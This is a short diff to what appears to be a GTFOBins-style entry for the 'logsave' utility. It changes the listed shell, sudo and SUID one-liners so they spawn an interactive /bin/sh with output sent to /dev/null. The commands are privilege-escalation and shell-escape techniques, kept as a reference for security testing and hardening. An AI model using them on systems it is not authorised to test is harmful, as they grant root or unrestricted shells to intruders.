@@ -1,9 +1,9 @@
 ---
 functions:
   shell:
-    - code: logsave temp.log /bin/sh
+    - code: logsave /dev/null /bin/sh -i
   sudo:
-    - code: sudo logsave temp.log /bin/sh
+    - code: sudo logsave /dev/null /bin/sh -i
   suid:
-    - code: ./logsave temp.log /bin/sh -p
+    - code: ./logsave /dev/null /bin/sh -i -p
 ---
